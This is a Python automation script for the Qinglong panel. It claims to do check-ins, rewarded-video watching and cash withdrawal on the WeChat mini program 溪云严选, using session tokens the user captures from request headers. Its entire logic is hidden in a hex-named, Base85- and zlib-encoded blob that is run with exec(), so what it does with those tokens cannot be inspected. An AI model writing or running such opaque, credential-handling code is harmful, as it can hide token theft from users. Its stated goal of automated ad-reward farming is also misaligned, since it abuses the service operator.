#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
name: 溪云严选
cron: 30 9 * * *
new Env('溪云严选');

功能:
  每日签到 / 观看激励视频 / 金币转化 / 提现

环境变量 XIYUN_YANXUAN (必填, 多账号用 & 分隔):
  单账号格式: token@scene 或 token#xwebid@scene
    - token  : 必填, 抓包请求头 x-token
    - scene  : 必填, 抓包请求头 scene (微信小程序启动场景值, 不要省略，虽然没有校验)
    - xwebid : 可选, 抓包请求头 x-web-id, 缺省自动生成 UUID（没有效验，但也最好填写）

可选环境变量:
  XIYUN_VIDEO_MIN_INTERVAL  视频奖励最小间隔秒, 默认 30
  XIYUN_VIDEO_MAX_INTERVAL  视频奖励最大间隔秒, 默认 60
  XIYUN_AUTO_WITHDRAW       0/1 自动提现, 默认 1
  XIYUN_DEBUG               0/1 调试日志, 默认 0

抓包指引:
  微信小程序请求 https://cid-cps-api.heliang.cc/* 的请求头中提取
  x-token / scene / x-web-id 三个字段

依赖: httpx  (青龙: pip install httpx)
"""


_0x3b861a=__import__(bytes.fromhex('626173653634').decode())
_0xee7d43=__import__(bytes.fromhex('7a6c6962').decode())
_0x19ae67=getattr(_0x3b861a,bytes.fromhex('6238356465636f6465').decode())
_0xc11531=getattr(_0xee7d43,bytes.fromhex('6465636f6d7072657373').decode())
_0x20d373=(
    'c-ozLX%n)@mge{SE6P?Zgz^TmGl-%hZn&U`=+ubpq5=vkh|6zp->SLQ)m0rg'
    'VkQh^%d>DY^U0IX(UFY642PsRUH5}?6kl~6G#^(d`KKF4!QRQhpDB!DDD3CT'
    'KW)c~YzM4V{-Gn8L)K6n`!`}FP1Y#v`)`p9iT+KT!ps`}@5IsH#0iYV@V^RU'
    'D27|;zjN96pRF>qMb`eU)7DqiCTssq&~vWF^%{fvzk>D4U!^FLpz!bS>ofWF'
    '`Onf|<tIP+X%dCbPf`5SA1eOoWd0RIe)Ed9af(K{KbiSGI)5{RVl+mOI7xhs'
    'xIfN+{XP?MjBix`r0Mri{Y}%qbl4Q~b(;8g@!vYwVi1%v{;ccw=>7lbaxem8'
    '{`(jHHhg~h+fe&4YQ8>yyZvuEYBoVR+|M8u?YJXFao7%k-t1Cem)3^DFN}qd'
    'xToHtZONF*&#%#qbl!z$N~`0&ne^M?p-Skc>+xFb6HBz~48X`b3|Hl`Pzyk8'
    '!M;py3lVVeDaq5e)^E{zTYoB#Ya3jzNamtO_d{LYI8<+ubg_J<o9C96fc<A<'
    '|5}vlI_Qmb5Dbug8v$I&U6;TTjf7VmB9EH{nHKF<Imh?UccmX;l-RC6wE)+R'
    '?T|1i5R7@_JmhWGtI^YPx$_$Dk{V7O<FXyTq+>{|uP!=}CF$%xef`mzg9IWi'
    'Tk|qAbFBpm#luAP2$kLVwO&bCg?5?O;3~J-tvw*qZgr~vFr#fU#aF^+QG9yP'
    'Xwk<)?D`h1g>Dac9#R|Ewg}$agfvT*JI}#TiK6McI_Wx#>Y<`mnUAy-4r&YW'
    'ZU;Hp`RFhcn=V-h(wut6!YlriIx8Op#H_cHwp725Je57FZ*%n^>^^bC&e6&)'
    'EE`QTs{wW3c06o=&hSR62C?bR-JRB%4Iz)SLfLYdk^D?z4F-oC2H3>0t;Z_2'
    'B<&fx8aA`-ri<|9#yvuq4)hw|H}}bqwi~RryT+dxH@EtF1s=XAuT!_U&Dwpk'
    '&ga?@&)Bp_ZX3@%HAA{(ifawMRe*aQOLCiG;SeZT)2qhEpzA$WTFqOVX~!Zq'
    'v<%!27vUPUCrBunSsOufF+oC$4osw#C`MyQmdVHLdN<Ip>ax%CxS&Jh?l>7@'
    'spJkOW1wuaZ$AavxaAuOi1K~LJ##5_sA=v@a`*gt6D!R!x_sYkexl&m%E}eE'
    '@rnDvG8hyOVIp0aK6e$!M;mo#>r)hX?`d&TUmul71lUYpzXZ1^p6ZuZ2V$S6'
    'wR~$|PU=C{J6XCU+;d|mre|z5*^TGBw7(?_?$Mji9}vx<&4$^fu8pvGU?O+f'
    'o4lLLW_-_g=P^-PoUTnS1nVsPNq9@D6bn~ZxbTQrFp@R*MzF%sUg^0p;A+~u'
    'B^JTWv82g;_u9arPA^#rXiHv<%7#;V55!#c-^)S$U4vWvN-STjnefhsTH<Jg'
    'ZGdBs6Sw=3!W_vtB@)9=qSVZ7xV?>fC2Mor+?vJ(HqO2Iq;2mH!J$!|qcoh9'
    'rB06#XO@Rxe#OiOnmjruUT{=&B8cCUc$$KT_|dz>iCms5VskBQt0m$-D9G{='
    'T&tFTBTcG47e4Rh8N_z&B1=?-jcN`U##!t;y@$!sE5_ZgPLnh{6%LJO+V9{Q'
    '<)tpjUZ%YTT)}M{?Skt7bn-<m)Caq)?dDcd!4-L|UZcwkJXCI~-Vv84B3w3!'
    ')(z@D=EHz|%<n>l=<%++(H#OPP!pLh-rd$^J|@uhw&qQsQYd=etyk<8juTq$'
    'yi!bhjh-YawT{f;P;D)5;_hXuEo@cl2aD(==Ry-+S1SOrxglwF^Yrh0ZQ>xY'
    '*(r^>SEUdJovvZnzFrB}_?f$~xg5BB_2M^yc-pIACuUqg@25VL+xdN2Xy2t0'
    'zc`NqE1PZ<9<7jzQ=^E8@RLF=bsd|={Zh`3Ja%3m*Sbyp{5)~Da>oWx85E+a'
    'M_+r9EO~FZd!({v-nNl@HbZ27c<|7psBu!-f0ErO-}rbpn3t?IvChIznB4DR'
    'rTreSymt2@$C(DdY6p=X^fkL<H$1}Rbp-xQjjjxo<r~!v*{OLRd5M&<Cl$Or'
    '<aOiY7~7|=^y71W@34_tpLj_TJ4()`<dp1%U#zYQ;tnZjLNf7#+aSEu6gyEC'
    'K?B6A!Y+SxCa<Ut-~EBSTwShmov4bVtY_Kgs0~#QVf&$5a=7%(s@R)+dPBDj'
    '-UlIDIaV9x+Omiv2^PO?eZH|N*geEm0DN*rf9<5ituwtI^4Gfz7=ZWmEnq6='
    'E(B_Gj*ivC&Qo$ig?bHDFQ!~b^|5040*bTQ>e6z#m#0K%F=^GEf-K0y9xfou'
    '+(S-V7+|6Lu~cD$yAsLB=8MC_Il(*@X+Jrc^GZIAl;YZ&9@&;vriyr0%1^7$'
    'z6uTnt+~)8`5=R6nx!b}?AOf2*)1Cj_zfV>6~Y%c+<wcatd+049ZGp~NvS}`'
    'DviNCd5M!-PfrnJYp>!(E8zsjdWBOWX^n&0R{WwS1|{k1Tw2mt@1>9C&4$!$'
    '$>n%RXqUV$X<oK!HuG*I+O3fV38&#?$WDzr)IU9^u0Ooa=wS};)zO2tt;PAy'
    '*gaAFq+EA<AapCErfa$5yOomud=S%GxdAn4K66&{9IqeComF{BoQ7UbYeES-'
    'ZBw>?pG5w&WY$Hkdu+Tq$^2D>>YEL8t^2+cKD)9j+TAhPDG00@Yn@AReVLrv'
    'Luo&tfu3?m94^={<7RbogbvTEgxFB~T51o{TW4K6R9D+`tBig#$~>JQ#p_ec'
    'Yt2w%#4cDA$HTgp0@7X<W}6!mRI_~qUsgNtWY|jtyr@c(7mE=!Ty1C_@4B3L'
    '!MlpUg>}A%^Mkr;9%px7VD&8zUOIVE8<5KL<!ySz4jzM&!yn=V!|7&!S??O3'
    'vyW)6LZS5(Ik&H{oz|S~J>Cr;ID9sbn@|>oO0`d8&CyVyXl;wr+h+-VJ)Eqm'
    'QZvOcd-7!NttN0W^PgNoDp;>LD-6aD^0tN-nYY~Ptp6Tdp65{u8Zzf|vSIAX'
    'zWlnr8;wrKqB?L+^n+7NJw>y+S~)xIMwdotLiY@@JlgZ`JE53*JY$}0u$KEY'
    'lR<RxT~*Gt@qD)KTsJ~5YiTb>SU<;5J+sx(r%$HU7w6oeRd-%cC$V;!jt;Js'
    'CHsAJ>Pe+{t2RkJm3QQz*&1rfLe<md$b=z&y>m`bzi0siBPkDagRJ5E-Bc@`'
    'H_c<zGbr8JG)}Xm_O_;5kvs4t+`AEgANj3wn56RE;|n)t_}F1*-vDl>(N=Eo'
    '>_{iI+0AIl+IjgYel#BFohH|!Y<84<LyxYNLtZgOU^PVE<ACq-PT1T5$6n>Q'
    '^Vk*Krze%K51rG?H^W&+s4(9736<_)fM(lI{Zb5|+M{~|_)X_ye%5m;HrgYM'
    '28q4ViOLY_YE&tb*H3nXI^rxQ8u+bNT#~2FVUo*2r%3Fo+eN3j4Y1(V-e~|j'
    'wjb_=EyB^<69nLL0zdRA0Mw#6nD9e<Ag4^Kyb<-JRjUVNns9tI=)UQXT@i%y'
    'VKQ?kogsZC#1{O3qJ>p!N=r3UdXacghpol=<HjC8e#y5A%)a1gv*(AsuH}|b'
    'dZ2q}8t7($G%x1TC&@+!-Ah?^eYc!QrNgqrYV9%EsG4P~BuqE#D^0lyBR_+r'
    'GtRYU{V}6rj1EVW!CWrVOHWdi!0va>Yforh7JBSn-+fbWpXjC<(3J<6NB#g5'
    '!02WalGKByW$8JG>dN?h>WFgv0$a&gJ{*g<ZS3rDXx^^c;6%uS%8vXPlgv>j'
    'v6YpI5&D$FvfuEY_gX)$74y51yYx~+sTa6F?sl?IC9B{2%&o_X;AfEiuuEB^'
    'B^hrd91qUaE0BiuZF#?TPnf)IcrBlI7S=LKlb&kb=dB(CtQLz`;R-Yb0WTTS'
    'P3+UVfWmv){oE9lkZ;#&c@9=-fNF2mcCh*`$nI&rr34qi{g*4WuWj#jos6o='
    'F;v6DbED?>6cm_BXAW&sr&EpMndP8rtLmxreE4ERrT|YC)#F(zOoVMx=9Cb+'
    'zSBcuG24<PJhRRXX(OUqTC?-e8$x$;+2dx&fNE8G@yzj2{qbF3+)lZ+exrFb'
    'iVv^a?6Yhxux(B`Q?z(`EE<m1kb`L}kCM*G9pl}?;DK5#tG#Z%nqQofX5S@T'
    '>YizKb0%1g-Q}k=$gQVqO_jyFYw6%OryUuj-va0P<N%vB7?TLeh6_#T+T9s?'
    '5mtKcM@c!4enYbbuo1x<ejT-%wF*5g3>JY@fG@0{es_QEcFzI3mFb!*;rrTT'
    'w%wh~bUGN!xqyn#<7=wU)B*a<?QFTA_~o5<s6LpgSoQtE&>V*HH9Hh^0M|$M'
    '*|aVm#t#yg*V>hSHr&B?m23xA8y}^}`jcpSY9HT6-pIO-Q}!f@B}+9~qdbcx'
    'dwzCg+F9pQd54#qXYtmvy`=2)ABmb##;$!HHyPi8gSVqjiX-V|Ef==l99@H*'
    '!MMoPozAm8eVDJ@k^-lrhL^|XWYoUU<!Wgj-MT=#GN?F@mGgMj@F<E*&=!3A'
    'o1CyKXMC3B8I*}1o@g7?lnsk~g|2)IzTx5<dafkg;V9lMnrq?p=cl)OM9@yH'
    'REE7*V^rs^7!xVLtp1gt)ML@BAZg)L01HhixxXjs)~^suD9KpqFbuCw<^b~$'
    'Uw^>IkXt=BvRG6!Q<>MWl7x-q6=h7#v?-*w-dMGtmsYp~@O#E4^MUS1T(!zJ'
    'TdM&yKS|U=q=x+|W1=&&)p?S9u551APL@pB7qB}k^;*-hJSE<zXV;;zqS%jk'
    'co?FD)sa!&lcvcjEi@zIa?j;<q)>}QGmLVY&hi&SJ~Ru6mJEIzeOxzgWz#2y'
    'Hu-*|Fq~)Eu-MO-{_v0}*6O@d4&-Cqhv>E5P4MmXRzGdY>IE3BPt0f6@sXkF'
    'YK`hjK)Cr1Pu#DLbK_jxu=z{dP>1HU-gu$Yk9t%edp1s|_W_JAPrzM{Rn*C5'
    'K|MV_kFw{Swrjasj#Z$fo*r21P=RCvD=L$;yGLIEF^GF^FP10A>j4@FZx}3G'
    'qY4MFvLUvI{YpiG8NK1(WuRC%bG2nAo@*|2n;o%EY`y0BXjSl~;z-oI?-sLm'
    'A3~q-{f0+%p&zK;%cgrkonl@$&RxgKZiaps=P`zoR?Awhnv3Q8XxE~4WntF`'
    'jXE~;pMxVv4ycm6NJ}fcJD+CuXm^ZkigCH}=6OBE54=?niziau_Il#Z0q<sf'
    '3wE-nVQZ><!$xP4ZJ^{u_pericyk89)E6U<Y62;KnuminRQJG=a<x=3Gf9uq'
    '#{xE%okiZSKk?bTV*vY}KF17Z4)<oQ=69WSH*b5Tz)NjU=R%=o3f8WnuHUo6'
    'jy)2i)^>Kn+qd1?<5#+_Ky{U-g%cl!@+Sa&UJ*fJCXoy^GsjmC2+7j|#5;T|'
    'c#oH0wZQDZNM!q$LA9{lyayT<hkg{t?5AA3`8%+EYrQ9x3R*+-;cL~WKCs!u'
    'XP;WHYD8X8%*<1{%2ZTL3R@D(tME|g&+c}(UsrU{;mlsteRST^c0U|bVBTy_'
    '(b;l=8}^#7se;avw<K-@4k06@Cdv7PM4=7kx`pkKa}K8DHU??UZoF*LbO!-a'
    'oLu+kYkO8~bpf-QM<MQ&+-5DNGA>zP@L|$Zf>sAPEjGy0!6}htHw}$j7ZUtd'
    'mjlUyGx>Sh9zH8ljFxhCfV3vlI(x74Isy2%CBew_)~oL3j~H&}nnv|GOM%4x'
    'tU<I!IAllnE5LSjp#J<OQG-rHs_ebpH^)foSc)txxS-BA6{8E5)$Jf3+k!qz'
    'Ds-a^ng>$nm*VWZ!TK&7!(D$VY6{K3c_yD%@>EO8M-5x(^bKEvB~;w=6~KVc'
    '`__;>ag$)b5z@Q*xyci)Ck4SRyp}bfdRO1u64Q7UpID-=pk}Muzt3W>S|n#B'
    'w8+2J>FE0~9s4SSXw*ESsTnu)GiroBM(}mOPp>(~w8%YqRJQC}Jod}hi3?hT'
    'yHlsi!O)=&w6)yKv2h26Q2Aqwz>#a#zrbS_i7JXBB=kCVfdUHi=laxdXu*I$'
    'dt=M)tPZuari$nk2BC+<1s#W~u20=jh(PJA^F?8Mi1A<psJmME16lX#r8<Za'
    '#Sw?^4ql1&+o}-1+N;ItQLwryy*qSxw0D8nU=u^@`n&z{NV>eiFWsVoELKI{'
    'n_9}fkRWTF!mBlVw>{MNLdEK=i2*RK12ep|vbIVYkXDOvamQ!3*`n+ztL7Lm'
    'qurSu*_73zu9J1AxRe3Te7`r+qF2xrK2r1gT}YT?Ak|0Wd6UyZvAwdpjUl#B'
    'V7xSI>-p+)oO6}eDO-=5ZgA03wixoqn}<WM*8Xuf^>XjkI$@Vt#0Yo2c0TPt'
    'AMgin>lJ!3cyE>^;O8HNFG3?Vm*UL-uz$^J=J&9E{xx%uTI2A&#(&LRI{scz'
    '-vh~h%@Fka()ivu?5~;W{PJsNeeZ1g*Nk!Izh(wwSAVGZHvFOL`^q4{P2B(Z'
    'jew^ehBCN6h-&Z;y7`|@_<t$rf7-t1Bv<e^F51Ov3}te^vDcunHGguW_$T8R'
    '^Cv(2DfiFdAKw4+hxXq|Y!t<9)8YOg{r@LRe`@!;0dxC@$^Y#G82W#HGw1(q'
    '&IxaU6B}0t{6p-orhaGg!9VH)e{T6Nj{UDhJVD_kiP{+bx7v$qp{T`KQE>K8'
    'e=_=4Dj%~b8gu?6{kOUSLD4@d2Y)p{)=ZnCxSy@+d0Hx?eF-HrQ^LLa#S_o$'
    '3Q@Nu-rq_eM6#FV+xxqRG#1Qszw)8hy!hFQegd>1%et4M!aQv*r2XFS>Fp^J'
    '()0AVzRo1N-@H%SP||>r*YKitCE>d(p#zS|IoO=^EBG5!memt#IM5PY&NkEC'
    'a-EydSeSYIx+mhkb+cJ(l%31ds>-m-K8LoYQfm#dYFK4~iu&Md)xN==R||t$'
    '_+d(pD}|yv!T>lyyn8_?!riIbK*(j*q(-%DWnK#V;JNAwgK@)zQKh!L-jwd='
    'f{X)%NA$V9$7nJfH?_LH$dAiyS_bMbySONXi-J>QxCL->u5H{%PuQ$v*T{t$'
    'qj1uBWFx`T%E@Cdn*9^mNpca=s8B4rg&mfTuqRVny7v}C(8rN1;2}JN7U4l-'
    '5N=lZZq8u8TP)wvCp-Qe>Th{lnGE8}x%tT7jg0owHPbT_Z}V{deInk(X8P)C'
    '$EDe^uxKJD^>a=NaZWDYJmH0`Bm_ABI2{W8!theB4YSouG+qsO0+;MXxs4C?'
    'UR_IVPHD&N4HMnrd^aZV_k9+{6ZF`J4*LVXPT~49)N6*mXhg}591yJaL{Q0G'
    'ws*@uP^>;)Q%+uAC;Js03eS~<J%j>_nfvx!g|;eW#wA989s)frU6fq&y9l-2'
    'FE`Z3)8X+RK6oHje;rVl$;zV&I~nsEbD`pMYpn;R+<06zk7Z{AJUjK_um$8b'
    'x!{L6wHyQ;e{Se=V%`P!iY(UPTCz}|YFZ`NW8j|kSK>TNZ;m<*wp*SqTp#I='
    'B<mw=4Ym-io<ES<C-i1Y_RAMZX~5W%g9dS|h}*>OTeJMJKJ!pi0MV&VtuNwq'
    'vqf5yH!b}9k8Aw+U;p^&n|xc~zh>iKXYr4M978(PpDU>FUmBr*p5k!qoa6tF'
    '6#oTOzt7D70;)ev+`lPh{>{wCEE4~JhK9;NoXm30*Ppt-o%|^Le*D=;l7IXb'
    'fj^Mx7w;6A#wq!MCjSZc>Abi'
)
exec(compile(_0xc11531(_0x19ae67(_0x20d373.encode())).decode(),bytes.fromhex('3c783e').decode(),bytes.fromhex('65786563').decode()))
